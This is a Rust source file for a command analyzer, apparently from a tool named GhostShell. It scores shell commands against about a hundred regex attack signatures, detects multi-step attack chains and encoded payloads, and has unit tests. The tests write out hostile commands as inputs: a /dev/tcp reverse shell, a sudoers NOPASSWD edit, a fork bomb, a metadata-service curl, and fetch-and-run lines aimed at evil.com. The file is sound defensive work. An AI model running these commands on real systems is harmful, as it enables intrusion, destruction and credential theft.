// ╔══════════════════════════════════════════════════════════════════╗
// ║              GhostShell — Command Analyzer                       ║
// ║         Pattern matching against known attack signatures         ║
// ╚══════════════════════════════════════════════════════════════════╝

use regex::Regex;

/// Command risk assessment
#[derive(Debug, Clone)]
pub struct CommandRisk {
    pub command: String,
    pub risk_level: RiskLevel,
    pub matched_patterns: Vec<MatchedPattern>,
    pub score: f64, // 0.0 (safe) to 1.0 (critical)
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
pub enum RiskLevel {
    Safe,
    Low,
    Medium,
    High,
    Critical,
}

#[derive(Debug, Clone)]
pub struct MatchedPattern {
    pub name: String,
    pub category: String,
    pub weight: f64,
}

/// Command analyzer with built-in attack signatures
pub struct CommandAnalyzer {
    patterns: Vec<AttackPattern>,
}

struct AttackPattern {
    name: String,
    category: String,
    regex: Regex,
    weight: f64,
}

impl CommandAnalyzer {
    pub fn new() -> Self {
        let mut analyzer = Self {
            patterns: Vec::new(),
        };
        analyzer.load_default_patterns();
        analyzer
    }

    fn load_default_patterns(&mut self) {
        let patterns = vec![
            // ── Reverse Shells ───────────────────────────────────
            ("reverse_shell_bash", "reverse_shell", r"bash\s+-i\s+>(&#?\s+)?/dev/tcp/", 1.0),
            ("reverse_shell_nc", "reverse_shell", r"nc\s+(-e\s+)?.*\s+\d+\.\d+\.\d+\.\d+\s+\d+", 0.9),
            ("reverse_shell_python", "reverse_shell", r"python.*socket.*connect", 0.9),
            ("reverse_shell_perl", "reverse_shell", r"perl.*socket.*INET", 0.9),
            ("reverse_shell_ruby", "reverse_shell", r"ruby.*TCPSocket", 0.9),
            ("reverse_shell_php", "reverse_shell", r"php.*fsockopen", 0.9),
            ("reverse_shell_socat", "reverse_shell", r"socat.*TCP.*EXEC", 0.9),
            ("reverse_shell_lua", "reverse_shell", r"lua.*socket\.tcp", 0.8),
            ("mkfifo_pipe", "reverse_shell", r"mkfifo\s+/tmp/", 0.8),
            ("reverse_shell_openssl", "reverse_shell", r"openssl.*s_client.*connect", 0.7),

            // ── Privilege Escalation ─────────────────────────────
            ("sudo_nopasswd", "privesc", r"echo.*NOPASSWD.*sudoers", 1.0),
            ("suid_find", "privesc", r"find.*-perm.*4000", 0.6),
            ("suid_set", "privesc", r"chmod\s+[u\+]*s\s+", 0.9),
            ("passwd_modify", "privesc", r"echo.*>>\s*/etc/(passwd|shadow)", 1.0),
            ("capability_set", "privesc", r"setcap.*cap_", 0.8),
            ("ld_preload", "privesc", r"LD_PRELOAD=", 0.8),
            ("ptrace_inject", "privesc", r"ptrace.*PTRACE_ATTACH", 0.9),
            ("kernel_module_load", "privesc", r"insmod\s+|modprobe\s+", 0.7),
            ("polkit_bypass", "privesc", r"pkexec\s+", 0.6),

            // ── Data Exfiltration ────────────────────────────────
            ("curl_post_data", "exfiltration", r"curl.*-d\s+@.*-X\s+POST", 0.7),
            ("base64_pipe", "exfiltration", r"base64.*\|.*curl", 0.8),
            ("dns_exfil", "exfiltration", r"dig.*@\d+\.\d+\.\d+\.\d+", 0.5),
            ("tar_upload", "exfiltration", r"tar.*\|.*curl|tar.*\|.*nc", 0.7),
            ("xxd_exfil", "exfiltration", r"xxd.*\|.*curl|xxd.*\|.*nc", 0.7),
            ("scp_exfil", "exfiltration", r"scp\s+.*@\d+\.\d+\.\d+\.\d+:", 0.6),
            ("rsync_exfil", "exfiltration", r"rsync.*\d+\.\d+\.\d+\.\d+:", 0.6),
            ("netcat_transfer", "exfiltration", r"nc\s+-[a-z]*l.*<", 0.7),

            // ── Persistence ──────────────────────────────────────
            ("cron_backdoor", "persistence", r"echo.*\*.*\*.*>>.*crontab", 0.9),
            ("ssh_key_inject", "persistence", r"echo.*ssh-rsa.*>>.*authorized_keys", 0.8),
            ("startup_modify", "persistence", r"echo.*>>.*\.bashrc|echo.*>>.*\.profile", 0.5),
            ("systemd_service", "persistence", r"systemctl\s+(enable|daemon-reload).*\.service", 0.6),
            ("initd_install", "persistence", r"update-rc\.d.*defaults", 0.7),
            ("udev_rule", "persistence", r"/etc/udev/rules\.d/", 0.7),
            ("at_schedule", "persistence", r"at\s+now\s*\+", 0.6),
            ("xdg_autostart", "persistence", r"\.config/autostart/.*\.desktop", 0.5),

            // ── Reconnaissance ───────────────────────────────────
            ("port_scan", "recon", r"nmap\s+", 0.4),
            ("network_enum", "recon", r"(ifconfig|ip\s+addr|netstat\s+-[a-z]*n)", 0.2),
            ("user_enum", "recon", r"cat\s+/etc/passwd", 0.3),
            ("history_access", "recon", r"cat.*history|cat.*bash_history", 0.5),
            ("masscan", "recon", r"masscan\s+", 0.5),
            ("gobuster", "recon", r"gobuster\s+", 0.5),
            ("dirb_scan", "recon", r"(dirb|dirsearch|ffuf)\s+", 0.5),
            ("aws_enum", "recon", r"aws\s+(iam|s3|ec2)\s+list", 0.4),
            ("ldap_search", "recon", r"ldapsearch\s+", 0.4),
            ("bloodhound", "recon", r"bloodhound|sharphound", 0.8),
            ("linpeas", "recon", r"(linpeas|linenum|linux-exploit-suggester)", 0.7),
            ("winpeas", "recon", r"(winpeas|winPEAS|powerup)", 0.7),

            // ── Destructive ──────────────────────────────────────
            ("rm_rf_root", "destructive", r"rm\s+-rf\s+/\s*$", 1.0),
            ("dd_wipe", "destructive", r"dd\s+if=/dev/zero.*of=/dev/sd", 1.0),
            ("fork_bomb", "destructive", r":\(\)\{.*\|.*&\s*\};:", 1.0),
            ("shred_data", "destructive", r"shred\s+-[a-z]*u\s+", 0.8),
            ("wipefs", "destructive", r"wipefs\s+", 0.9),

            // ── Crypto Mining ────────────────────────────────────
            ("crypto_miner", "cryptomining", r"(minerd|xmrig|cpuminer|stratum)", 0.9),
            ("crypto_pool", "cryptomining", r"stratum\+tcp://", 0.9),

            // ── Anti-Forensics ───────────────────────────────────
            ("log_wipe", "anti_forensics", r"echo\s*>\s*/var/log/", 0.9),
            ("history_clear", "anti_forensics", r"(history\s+-c|unset\s+HISTFILE|HISTSIZE=0)", 0.7),
            ("timestamp_forge", "anti_forensics", r"touch\s+-t\s+\d{12}", 0.6),
            ("shred_logs", "anti_forensics", r"shred.*(/var/log|\.log)", 0.9),
            ("auditctl_disable", "anti_forensics", r"auditctl\s+-[eD]", 0.9),

            // ── Container Escapes ────────────────────────────────
            ("container_nsenter", "container_escape", r"nsenter\s+-t\s+1", 0.9),
            ("container_docker_sock", "container_escape", r"/var/run/docker\.sock", 0.8),
            ("container_runc_exploit", "container_escape", r"runc\s+", 0.7),
            ("container_cgroup_escape", "container_escape", r"/sys/fs/cgroup.*release_agent", 1.0),
            ("container_proc_mount", "container_escape", r"mount.*-t\s+proc\s+proc\s+/", 0.8),
            ("container_privileged", "container_escape", r"docker\s+run.*--privileged", 0.7),
            ("container_host_pid", "container_escape", r"docker\s+run.*--pid=host", 0.8),
            ("container_host_net", "container_escape", r"docker\s+run.*--net=host", 0.6),

            // ── Cloud Credential Theft ───────────────────────────
            ("aws_metadata", "cloud_theft", r"169\.254\.169\.254", 0.9),
            ("gcp_metadata", "cloud_theft", r"metadata\.google\.internal", 0.9),
            ("azure_metadata", "cloud_theft", r"169\.254\.169\.254.*metadata/instance", 0.9),
            ("aws_cred_file", "cloud_theft", r"cat.*\.aws/(credentials|config)", 0.8),
            ("gcp_cred_file", "cloud_theft", r"cat.*gcloud.*credentials", 0.8),
            ("azure_cred_file", "cloud_theft", r"cat.*\.azure/accessTokens", 0.8),
            ("imds_token", "cloud_theft", r"X-aws-ec2-metadata-token", 0.9),
            ("kube_secrets", "cloud_theft", r"kubectl\s+get\s+secret", 0.7),

            // ── Supply Chain Attacks ─────────────────────────────
            ("pip_malicious_index", "supply_chain", r"pip\s+install.*--extra-index-url", 0.7),
            ("npm_malicious_registry", "supply_chain", r"npm\s+config\s+set\s+registry", 0.6),
            ("curl_pipe_bash", "supply_chain", r"curl.*\|\s*(bash|sh|zsh)", 0.8),
            ("wget_pipe_bash", "supply_chain", r"wget.*-O\s*-\s*\|\s*(bash|sh)", 0.8),
            ("pip_install_git", "supply_chain", r"pip\s+install\s+git\+http", 0.5),
            ("npm_preinstall", "supply_chain", r"npm.*preinstall.*curl", 0.8),

            // ── Fileless Malware ─────────────────────────────────
            ("memfd_create", "fileless", r"memfd_create", 0.9),
            ("dev_shm_exec", "fileless", r"/dev/shm/.*\.(sh|elf|bin)", 0.8),
            ("proc_self_exe", "fileless", r"/proc/self/(exe|mem|maps)", 0.7),
            ("process_hollow", "fileless", r"ptrace.*POKETEXT", 0.9),
            ("bash_dev_tcp", "fileless", r"/dev/tcp/\d+\.\d+\.\d+\.\d+/\d+", 0.9),
            ("ld_preload_inject", "fileless", r"LD_PRELOAD=.*\.so", 0.8),

            // ── Windows LOLBins ──────────────────────────────────
            ("certutil_download", "lolbin", r"certutil\s+.*-urlcache", 0.9),
            ("certutil_encode", "lolbin", r"certutil\s+.*-encode|-decode", 0.8),
            ("mshta_exec", "lolbin", r"mshta\s+", 0.9),
            ("regsvr32_exec", "lolbin", r"regsvr32\s+.*(/s|/i:)", 0.9),
            ("rundll32_exec", "lolbin", r"rundll32\s+.*javascript:", 1.0),
            ("powershell_bypass", "lolbin", r"powershell.*-[eE](nc|ncodedcommand)\s+", 1.0),
            ("powershell_iex", "lolbin", r"powershell.*IEX|Invoke-Expression", 0.9),
            ("powershell_download", "lolbin", r"(Net\.WebClient|Invoke-WebRequest|Start-BitsTransfer)", 0.7),
            ("amsi_bypass", "lolbin", r"(AmsiUtils|amsiInitFailed|AmsiScanBuffer)", 1.0),
            ("wmic_exec", "lolbin", r"wmic\s+process\s+call\s+create", 0.8),
            ("bitsadmin_transfer", "lolbin", r"bitsadmin\s+/transfer", 0.7),
            ("msbuild_exec", "lolbin", r"msbuild\s+.*\.csproj|\.xml", 0.7),
            ("cmstp_bypass", "lolbin", r"cmstp\s+/ni\s+/s", 0.9),

            // ── Encoded Payloads ─────────────────────────────────
            ("base64_decode_exec", "encoded_payload", r"base64\s+-d.*\|\s*(bash|sh|python)", 0.9),
            ("echo_base64_pipe", "encoded_payload", r"echo\s+[A-Za-z0-9+/=]{20,}\s*\|\s*base64\s+-d", 0.9),
            ("xxd_reverse", "encoded_payload", r"xxd\s+-r.*\|\s*(bash|sh)", 0.8),
            ("python_exec_base64", "encoded_payload", r"python.*__import__.*exec.*base64", 0.9),
            ("eval_atob", "encoded_payload", r"eval\(atob\(", 0.9),
            ("hex_shellcode", "encoded_payload", r"\\x[0-9a-fA-F]{2}(\\x[0-9a-fA-F]{2}){10,}", 0.9),

            // ── Credential Harvesting ────────────────────────────
            ("mimikatz", "credential_harvest", r"(mimikatz|sekurlsa|kerberos::)", 1.0),
            ("lazagne", "credential_harvest", r"(lazagne|LaZagne)", 0.9),
            ("shadow_dump", "credential_harvest", r"unshadow\s+|john\s+.*shadow", 0.9),
            ("wifi_creds", "credential_harvest", r"netsh\s+wlan\s+show\s+profile.*key=clear", 0.7),
            ("browser_creds", "credential_harvest", r"Login\s+Data|cookies\.sqlite|key[34]\.db", 0.8),
        ];

        for (name, category, pattern, weight) in patterns {
            if let Ok(regex) = Regex::new(pattern) {
                self.patterns.push(AttackPattern {
                    name: name.to_string(),
                    category: category.to_string(),
                    regex,
                    weight,
                });
            }
        }
    }

    /// Analyze a command for risk
    pub fn analyze(&self, command: &str) -> CommandRisk {
        let mut matched = Vec::new();
        let mut max_weight = 0.0;

        for pattern in &self.patterns {
            if pattern.regex.is_match(command) {
                matched.push(MatchedPattern {
                    name: pattern.name.clone(),
                    category: pattern.category.clone(),
                    weight: pattern.weight,
                });
                if pattern.weight > max_weight {
                    max_weight = pattern.weight;
                }
            }
        }

        let risk_level = if max_weight >= 0.9 {
            RiskLevel::Critical
        } else if max_weight >= 0.7 {
            RiskLevel::High
        } else if max_weight >= 0.4 {
            RiskLevel::Medium
        } else if max_weight > 0.0 {
            RiskLevel::Low
        } else {
            RiskLevel::Safe
        };

        CommandRisk {
            command: command.to_string(),
            risk_level,
            matched_patterns: matched,
            score: max_weight,
        }
    }

    /// Get total pattern count
    pub fn pattern_count(&self) -> usize {
        self.patterns.len()
    }
}

impl Default for CommandAnalyzer {
    fn default() -> Self {
        Self::new()
    }
}

// ── Command Chain Analyzer ───────────────────────────────────────

/// Multi-step attack chain definitions
#[derive(Debug, Clone)]
pub struct AttackChain {
    pub name: String,
    pub steps: Vec<String>,   // Categories that form the chain
    pub severity: f64,
}

/// Detects multi-step attack sequences across consecutive commands
pub struct CommandChainAnalyzer {
    /// Known attack chains
    chains: Vec<AttackChain>,
    /// Recent command categories
    recent_categories: Vec<String>,
    /// Max history to keep
    max_history: usize,
}

impl CommandChainAnalyzer {
    pub fn new() -> Self {
        let chains = vec![
            AttackChain {
                name: "Recon-to-Shell".to_string(),
                steps: vec!["recon".to_string(), "reverse_shell".to_string()],
                severity: 1.0,
            },
            AttackChain {
                name: "Recon-Privesc-Persistence".to_string(),
                steps: vec!["recon".to_string(), "privesc".to_string(), "persistence".to_string()],
                severity: 1.0,
            },
            AttackChain {
                name: "Access-Exfiltrate".to_string(),
                steps: vec!["reverse_shell".to_string(), "exfiltration".to_string()],
                severity: 1.0,
            },
            AttackChain {
                name: "Privesc-AntiForensics".to_string(),
                steps: vec!["privesc".to_string(), "anti_forensics".to_string()],
                severity: 0.9,
            },
            AttackChain {
                name: "Cloud-Theft-Exfil".to_string(),
                steps: vec!["cloud_theft".to_string(), "exfiltration".to_string()],
                severity: 1.0,
            },
            AttackChain {
                name: "Container-Escape-Privesc".to_string(),
                steps: vec!["container_escape".to_string(), "privesc".to_string()],
                severity: 1.0,
            },
        ];

        Self {
            chains,
            recent_categories: Vec::new(),
            max_history: 20,
        }
    }

    /// Record a command's risk category and check for attack chains
    pub fn record_category(&mut self, category: &str) -> Vec<String> {
        self.recent_categories.push(category.to_string());
        if self.recent_categories.len() > self.max_history {
            self.recent_categories.remove(0);
        }

        let mut detected = Vec::new();
        for chain in &self.chains {
            if self.matches_chain(&chain.steps) {
                detected.push(chain.name.clone());
            }
        }
        detected
    }

    /// Check if the recent categories contain a chain sequence
    fn matches_chain(&self, steps: &[String]) -> bool {
        if steps.is_empty() || self.recent_categories.len() < steps.len() {
            return false;
        }

        let mut step_idx = 0;
        for cat in &self.recent_categories {
            if cat == &steps[step_idx] {
                step_idx += 1;
                if step_idx == steps.len() {
                    return true;
                }
            }
        }
        false
    }

    /// Clear history
    pub fn clear(&mut self) {
        self.recent_categories.clear();
    }

    /// Get recent category count
    pub fn history_len(&self) -> usize {
        self.recent_categories.len()
    }
}

impl Default for CommandChainAnalyzer {
    fn default() -> Self {
        Self::new()
    }
}

// ── Encoded Command Detection ────────────────────────────────────

/// Detects encoded payloads in command strings
pub struct EncodedCommandDetector;

impl EncodedCommandDetector {
    /// Check if a command contains base64-encoded content
    pub fn detect_base64(command: &str) -> Option<String> {
        // Look for long base64-like strings (>= 20 chars, valid base64 charset)
        for word in command.split_whitespace() {
            if word.len() >= 20
                && word.chars().all(|c| c.is_ascii_alphanumeric() || c == '+' || c == '/' || c == '=')
                && word.contains(|c: char| c.is_ascii_uppercase())
                && word.contains(|c: char| c.is_ascii_lowercase())
            {
                return Some(format!("Potential base64 payload detected ({} chars)", word.len()));
            }
        }
        None
    }

    /// Check if a command contains hex-encoded content
    pub fn detect_hex_payload(command: &str) -> Option<String> {
        // Look for sequences like \x41\x42\x43...
        let hex_count = command.matches("\\x").count();
        if hex_count >= 10 {
            return Some(format!("Hex-encoded payload detected ({} bytes)", hex_count));
        }
        None
    }

    /// Combined detection
    pub fn analyze(command: &str) -> Vec<String> {
        let mut detections = Vec::new();
        if let Some(b64) = Self::detect_base64(command) {
            detections.push(b64);
        }
        if let Some(hex) = Self::detect_hex_payload(command) {
            detections.push(hex);
        }
        detections
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_safe_command() {
        let analyzer = CommandAnalyzer::new();
        let risk = analyzer.analyze("ls -la");
        assert_eq!(risk.risk_level, RiskLevel::Safe);
        assert!(risk.matched_patterns.is_empty());
    }

    #[test]
    fn test_reverse_shell_detection() {
        let analyzer = CommandAnalyzer::new();
        let risk = analyzer.analyze("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1");
        assert_eq!(risk.risk_level, RiskLevel::Critical);
        assert!(risk.matched_patterns.iter().any(|p| p.category == "reverse_shell"));
    }

    #[test]
    fn test_privesc_detection() {
        let analyzer = CommandAnalyzer::new();
        let risk = analyzer.analyze("echo 'user ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers");
        assert_eq!(risk.risk_level, RiskLevel::Critical);
    }

    #[test]
    fn test_fork_bomb() {
        let analyzer = CommandAnalyzer::new();
        let risk = analyzer.analyze(":(){ :|:& };:");
        assert_eq!(risk.risk_level, RiskLevel::Critical);
    }

    #[test]
    fn test_recon() {
        let analyzer = CommandAnalyzer::new();
        let risk = analyzer.analyze("nmap -sV 192.168.1.0/24");
        assert!(risk.risk_level >= RiskLevel::Medium);
    }

    #[test]
    fn test_container_escape() {
        let analyzer = CommandAnalyzer::new();
        let risk = analyzer.analyze("nsenter -t 1 -m -u -i -n -p /bin/bash");
        assert!(risk.risk_level >= RiskLevel::High);
        assert!(risk.matched_patterns.iter().any(|p| p.category == "container_escape"));
    }

    #[test]
    fn test_cloud_metadata() {
        let analyzer = CommandAnalyzer::new();
        let risk = analyzer.analyze("curl http://169.254.169.254/latest/meta-data/");
        assert!(risk.risk_level >= RiskLevel::High);
    }

    #[test]
    fn test_lolbin_detection() {
        let analyzer = CommandAnalyzer::new();
        let risk = analyzer.analyze("certutil -urlcache -split -f http://evil.com/payload.exe");
        assert!(risk.risk_level >= RiskLevel::High);
    }

    #[test]
    fn test_encoded_payload_detection() {
        let analyzer = CommandAnalyzer::new();
        let risk = analyzer.analyze("echo SGVsbG8gV29ybGQhCg== | base64 -d | bash");
        assert!(risk.risk_level >= RiskLevel::High);
    }

    #[test]
    fn test_pattern_count() {
        let analyzer = CommandAnalyzer::new();
        assert!(analyzer.pattern_count() >= 90, "Expected 90+ patterns, got {}", analyzer.pattern_count());
    }

    #[test]
    fn test_chain_analyzer() {
        let mut chain = CommandChainAnalyzer::new();
        let r1 = chain.record_category("recon");
        assert!(r1.is_empty());
        let r2 = chain.record_category("reverse_shell");
        assert!(r2.contains(&"Recon-to-Shell".to_string()));
    }

    #[test]
    fn test_encoded_command_base64() {
        let result = EncodedCommandDetector::detect_base64("echo SGVsbG8gV29ybGQhIFRoaXMgaXM= | base64 -d");
        assert!(result.is_some());
    }

    #[test]
    fn test_encoded_command_hex() {
        let result = EncodedCommandDetector::detect_hex_payload(
            r"\x48\x65\x6c\x6c\x6f\x20\x57\x6f\x72\x6c\x64\x21"
        );
        assert!(result.is_some());
    }

    #[test]
    fn test_encoded_command_safe() {
        let result = EncodedCommandDetector::analyze("ls -la");
        assert!(result.is_empty());
    }

    #[test]
    fn test_supply_chain_curl_pipe() {
        let analyzer = CommandAnalyzer::new();
        let risk = analyzer.analyze("curl https://evil.com/install.sh | bash");
        assert!(risk.risk_level >= RiskLevel::High);
    }
}
